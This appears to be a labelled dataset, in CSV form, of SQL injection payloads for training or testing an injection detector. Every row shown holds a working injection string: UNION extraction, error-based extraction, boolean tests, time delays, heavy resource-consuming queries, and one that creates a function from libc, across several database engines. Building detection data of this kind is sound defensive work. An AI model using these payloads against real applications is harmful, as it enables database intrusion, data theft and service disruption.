payload,length,label
"1')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('bmbt'='bmbt",123,SQL_INJECTION
"-4093')) union all select 5785,5785,5785#",41,SQL_INJECTION
"1) as tgqd where 6369=6369 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",224,SQL_INJECTION
"1' in boolean mode);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",111,SQL_INJECTION
"1)) as berd where 5803=5803 union all select null,null,null,null,null,null,null--",81,SQL_INJECTION
"1%"" union all select null,null,null,null,null,null,null,null,null,null#",71,SQL_INJECTION
1' in boolean mode) and (3020=3020)*6703#,41,SQL_INJECTION
"1,(select (case when (5217=5217) then 1 else 5217*(select 5217 from mysql.db) end))",83,SQL_INJECTION
-9771' or 5113=5365,19,SQL_INJECTION
"1' in boolean mode) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))#",175,SQL_INJECTION
"1"") union all select null,null,null,null,null,null,null--",57,SQL_INJECTION
"1) as lfra where 2669=2669 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",120,SQL_INJECTION
"1"") as hsws where 6656=6656;waitfor delay '0:0:5'--",51,SQL_INJECTION
"-4756%')) union all select 7824,7824,7824,7824,7824,7824,7824,7824#",67,SQL_INJECTION
1%')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('%'=',204,SQL_INJECTION
"-9881"")) or 9850=8118#",22,SQL_INJECTION
-9014' order by 1--,19,SQL_INJECTION
-5854))) union all select 5645#,31,SQL_INJECTION
"-8436') as frmf where 7225=7225 or make_set(9354=9354,7185)--",61,SQL_INJECTION
"1' in boolean mode) or 8156=(select count(*) from generate_series(1,5000000))--",79,SQL_INJECTION
"1""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""djrh""=""djrh",224,SQL_INJECTION
"1%"")) or 6793=(select 6793 from pg_sleep(5)) and ((""%""=""",56,SQL_INJECTION
-9950' or 4425=1975,19,SQL_INJECTION
"1%"";select count(*) from generate_series(1,5000000) and ""%""=""",61,SQL_INJECTION
"1"" union all select null,null,null,null,null,null,null,null,null--",66,SQL_INJECTION
"-8159 where 2793=2793 union all select 2793,2793,2793,2793,2793#",64,SQL_INJECTION
"1) where 3076=3076 union all select null,null,null,null,null--",62,SQL_INJECTION
"1%"")) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((""%""=""",147,SQL_INJECTION
"-6733') where 4024=4024 union all select 4024,4024,4024,4024#",61,SQL_INJECTION
"1' and 8407=(select count(*) from generate_series(1,5000000))",61,SQL_INJECTION
"1""))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",112,SQL_INJECTION
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('bhlx' like 'bhlx",114,SQL_INJECTION
"1') and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",156,SQL_INJECTION
-9581) as jkqo where 5200=5200 or 6872=6872--,45,SQL_INJECTION
1')) as tley where 3539=3539;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,93,SQL_INJECTION
"1"") where 7010=7010 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",118,SQL_INJECTION
"1"")) as wfne where 8933=8933;select (case when (3855=3855) then 3855 else 1/(select 0) end)--",93,SQL_INJECTION
"1"")) as fapw where 4722=4722 union all select null,null,null,null,null,null,null,null,null,null#",96,SQL_INJECTION
"1%"" and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""%""=""",119,SQL_INJECTION
"1';select benchmark(5000000,md5(0x4c4d6142)) and 'fgcg'='fgcg",61,SQL_INJECTION
"1"") where 2633=2633 union all select null,null,null,null#",57,SQL_INJECTION
"1' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and 'eovg' like 'eovg",226,SQL_INJECTION
"1'+(select oqvo where 7448=7448 union all select null,null,null,null,null--",75,SQL_INJECTION
"1' or 8421=(select count(*) from generate_series(1,5000000)) and 'jiyx'='jiyx",77,SQL_INJECTION
-3867%') or 3084=5633 and ('%'=',32,SQL_INJECTION
"1""))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (((""tiet"" like ""tiet",132,SQL_INJECTION
"1 where 2823=2823 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",120,SQL_INJECTION
"1"" where 7796=7796;select case when 7717=7717 then 1 else null end--",68,SQL_INJECTION
1 rlike sleep(5)-- muhp,23,SQL_INJECTION
"1')) as qaki where 5272=5272;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",96,SQL_INJECTION
1 where 5080=5080;select (case when (5698=3453) then 5698 else 1/(select 0) end)--,82,SQL_INJECTION
-6540') where 5019=5019 or (8459=8459)*4906--,45,SQL_INJECTION
1' where 9003=9003 waitfor delay '0:0:5'--,42,SQL_INJECTION
"-1203"")) or 8571=8571--",23,SQL_INJECTION
1 where 7442=7442;begin user_lock.sleep(5); end--,49,SQL_INJECTION
1%';(select * from (select(sleep(5)))acdk)#,43,SQL_INJECTION
"1%') union all select null,null,null,null,null--",48,SQL_INJECTION
"1%');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ('%'='",98,SQL_INJECTION
"1') where 8268=8268 union all select null,null,null,null--",58,SQL_INJECTION
-8023' or 6872=6872,19,SQL_INJECTION
"1"")) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((""nubc"" like ""nubc",102,SQL_INJECTION
"1);select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (7711=7711",76,SQL_INJECTION
"1"" or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ""ljkg""=""ljkg",93,SQL_INJECTION
"1) or elt(6272=6272,sleep(5)) and (8600=8600",44,SQL_INJECTION
"1'||(select 'dukt' where 3206=3206 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))||'",188,SQL_INJECTION
"1%') and elt(3114=3114,sleep(5))#",33,SQL_INJECTION
"-8093"")) as oboi where 1476=1476 union all select 1476,1476,1476,1476#",70,SQL_INJECTION
1 where 9932=9932;select sleep(5)--,35,SQL_INJECTION
-2751 where 6334=6334 or (9668=5845)*5845--,43,SQL_INJECTION
1)) rlike (select * from (select(sleep(5)))sgvo) and ((1476=1476,64,SQL_INJECTION
"-3261""))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""yxms""=""yxms",224,SQL_INJECTION
"1"" where 4066=4066 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",112,SQL_INJECTION
"1' where 8083=8083 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",112,SQL_INJECTION
"-3059 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",200,SQL_INJECTION
"1 where 8506=8506;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",101,SQL_INJECTION
"1%"")) or 8156=(select count(*) from generate_series(1,5000000))--",65,SQL_INJECTION
1') as inid where 7812=7812 or 6793=(select 6793 from pg_sleep(5))--,68,SQL_INJECTION
1)) as efjb where 4642=4642 order by 1#,39,SQL_INJECTION
"1) union all select null,null,null,null,null--",46,SQL_INJECTION
"1)) as uizx where 2512=2512 and make_set(1402=2908,2908)--",58,SQL_INJECTION
"-1512"" union all select 9688,9688,9688,9688,9688,9688,9688,9688,9688,9688--",75,SQL_INJECTION
"1"");waitfor delay '0:0:5' and (""dmcu""=""dmcu",43,SQL_INJECTION
1%' and (2439=2555)*2555 and '%'=',34,SQL_INJECTION
"1%')) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('%'='",157,SQL_INJECTION
"1'))) and 3824=benchmark(5000000,md5(0x76555642)) and ((('subq' like 'subq",74,SQL_INJECTION
"1')) as ijyi where 3694=3694 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",217,SQL_INJECTION
"1%')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('%'='",123,SQL_INJECTION
1'+(select lqhd where 4251=4251 and (8754=5779)*5779)+',55,SQL_INJECTION
"1' or 8421=(select count(*) from generate_series(1,5000000)) and 'ptou'='ptou",77,SQL_INJECTION
"1%"") or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",99,SQL_INJECTION
-4637' or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),192,SQL_INJECTION
"1%"");select (case when (3168=5577) then 3168 else 3168*(select 3168 from mysql.db) end)#",88,SQL_INJECTION
1');select case when 6662=9889 then 1 else null end--,53,SQL_INJECTION
"1""))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""sajl""=""sajl",131,SQL_INJECTION
"-4984%""))) union all select 6980,6980,6980,6980,6980,6980,6980,6980#",68,SQL_INJECTION
1') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('sgdj' like 'sgdj,225,SQL_INJECTION
"1"")));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""jwzy""=""jwzy",84,SQL_INJECTION
"1"") waitfor delay '0:0:5'--",27,SQL_INJECTION
"1%""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((""%""=""",132,SQL_INJECTION
"1'))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('fzgy'='fzgy",221,SQL_INJECTION
"1"" where 6004=6004;select benchmark(5000000,md5(0x4c4d6142))--",62,SQL_INJECTION
"-8344 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))-- wjpa",207,SQL_INJECTION
"-5160') union all select 8067,8067,8067,8067,8067,8067,8067--",61,SQL_INJECTION
"-3009'+(select 'gqbo' where 6915=6915 union all select 6915,6915--",66,SQL_INJECTION
"1"") where 6478=6478 union all select null,null,null,null,null,null#",67,SQL_INJECTION
"1"") as pobe where 1704=1704;begin dbms_lock.sleep(5); end--",59,SQL_INJECTION
"1') where 6772=6772 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",223,SQL_INJECTION
"1) or 8156=(select count(*) from generate_series(1,5000000))--",62,SQL_INJECTION
"1 or 8421=(select count(*) from generate_series(1,5000000))-- xgyc",66,SQL_INJECTION
"-8200' in boolean mode) union all select 3360,3360--",52,SQL_INJECTION
"1%' and make_set(8403=8403,8899) and '%'='",42,SQL_INJECTION
"-7824""))) union all select 3800,3800,3800,3800,3800,3800,3800,3800,3800--",73,SQL_INJECTION
"1%""))) rlike (select (case when (4442=4476) then 1 else 0x28 end)) and (((""%""=""",79,SQL_INJECTION
"1' where 4860=4860 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",170,SQL_INJECTION
1')) or sleep(5) and (('zxik'='zxik,35,SQL_INJECTION
"1))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((3366=3366",205,SQL_INJECTION
1'+(select cxvy where 7421=7421;begin user_lock.sleep(5); end)+',64,SQL_INJECTION
1' where 5335=5335;select pg_sleep(5)--,39,SQL_INJECTION
1'||(select 'uedy' where 8816=8816;select case when 6558=4327 then 1 else null end--,84,SQL_INJECTION
1%'));select (case when (5203=6330) then 5203 else 5203*(select 5203 from mysql.db) end)#,89,SQL_INJECTION
"1') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ('mevd'='mevd",111,SQL_INJECTION
"-1998') as kgvf where 2346=2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",95,SQL_INJECTION
1)) as quap where 7625=7625;select (case when (4568=4241) then 4568 else cast(1 as int)/(select 0 from dual) end) from dual--,125,SQL_INJECTION
"1) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",105,SQL_INJECTION
1%');select case when 4488=5522 then 1 else null end--,54,SQL_INJECTION
"1');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ('wweo'='wweo",107,SQL_INJECTION
"1')) as fusi where 2788=2788 or 8514=benchmark(5000000,md5(0x544d5a4c))#",72,SQL_INJECTION
"1)) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((3038=3038",174,SQL_INJECTION
"-6440))) union all select 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--",77,SQL_INJECTION
"1"")) as dnhd where 2657=2657 or 4240=(select 4240 from pg_sleep(5))--",69,SQL_INJECTION
"-6198"") or make_set(3602=2178,2178) and (""xksq"" like ""xksq",58,SQL_INJECTION
1) or 6793=(select 6793 from pg_sleep(5)) and (7015=7015,56,SQL_INJECTION
"-8868"") where 5681=5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681--",92,SQL_INJECTION
"1"") and 8594=(select 8594 from pg_sleep(5))--",45,SQL_INJECTION
-4896') union all select 1929--,31,SQL_INJECTION
"1"")));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",99,SQL_INJECTION
"-3445 union all select 5505,5505,5505--",39,SQL_INJECTION
"-2167'))) union all select 3804,3804,3804,3804,3804,3804#",57,SQL_INJECTION
"-2120"") union all select 9614--",31,SQL_INJECTION
1') as dpmh where 5281=5281 and 2006=2006,41,SQL_INJECTION
"-1907"")) or 2782=3591",21,SQL_INJECTION
"1%')) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('%'='",173,SQL_INJECTION
"1"") and 7533=7533 and (""yqzq""=""yqzq",35,SQL_INJECTION
"1')) as oocd where 2919=2919 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",90,SQL_INJECTION
"-6478"")) union all select 7087,7087,7087,7087,7087,7087,7087,7087--",67,SQL_INJECTION
"-8153') as qhlb where 4948=4948 union all select 4948,4948,4948,4948,4948,4948#",79,SQL_INJECTION
"1"")) as luon where 4676=4676 rlike sleep(5)#",44,SQL_INJECTION
"1"")) and (3020=3020)*6703 and ((""bely""=""bely",44,SQL_INJECTION
"1))) union all select null,null,null,null,null--",48,SQL_INJECTION
1'+(select 'qxmo' where 9511=9511 rlike (select * from (select(sleep(5)))vwyq)#,79,SQL_INJECTION
1' in boolean mode);begin dbms_lock.sleep(5); end#,50,SQL_INJECTION
"1');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ('fnon' like 'fnon",109,SQL_INJECTION
"1) union all select null,null,null,null,null,null,null,null,null--",66,SQL_INJECTION
1'+(select enzd where 6046=6046 and (3020=3020)*6703)+',55,SQL_INJECTION
"1')) as hmyc where 6732=6732 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",133,SQL_INJECTION
"-7579%"" or 6570=1764",20,SQL_INJECTION
"1""))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (((""yopd"" like ""yopd",120,SQL_INJECTION
"1%"")));select (case when (4996=1734) then 1 else 4996*(select 4996 from master..sysdatabases) end)--",100,SQL_INJECTION
1'));select (case when (3365=6236) then 3365 else 1/(select 0) end)--,69,SQL_INJECTION
"1"" where 5353=5353 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",123,SQL_INJECTION
"1%')));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",91,SQL_INJECTION
"1%"" or (select * from (select(sleep(5)))sddo)#",46,SQL_INJECTION
"-4925"" union all select 5686,5686,5686,5686,5686,5686,5686#",59,SQL_INJECTION
1'));select pg_sleep(5)--,25,SQL_INJECTION
-9564 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),236,SQL_INJECTION
"1;select count(*) from generate_series(1,5000000)# fnck",55,SQL_INJECTION
"1%"";call regexp_substring(repeat(right(char(2385),0),500000000),null)--",71,SQL_INJECTION
"1' where 8803=8803 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",170,SQL_INJECTION
"1' where 7125=7125 or elt(6272=6272,sleep(5))--",47,SQL_INJECTION
"1"") union all select null,null,null,null,null,null,null#",56,SQL_INJECTION
"-2241))) or make_set(9354=9354,7185) and (((6840=6840",53,SQL_INJECTION
1)));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,113,SQL_INJECTION
"1"") where 2764=2764 rlike (select (case when (7689=7689) then 1 else 0x28 end))--",81,SQL_INJECTION
"1%"" and (select * from (select(sleep(5)))fzno) and ""%""=""",56,SQL_INJECTION
1';begin user_lock.sleep(5); end,32,SQL_INJECTION
"1"")) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""dqis""=""dqis",163,SQL_INJECTION
-8378%') union all select 5491#,31,SQL_INJECTION
"1%"")) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((""%""=""",111,SQL_INJECTION
"1' in boolean mode);iif(5257=5257,1,1/0)",40,SQL_INJECTION
"-6041')) or make_set(9835=1367,1367) and (('hxjf'='hxjf",55,SQL_INJECTION
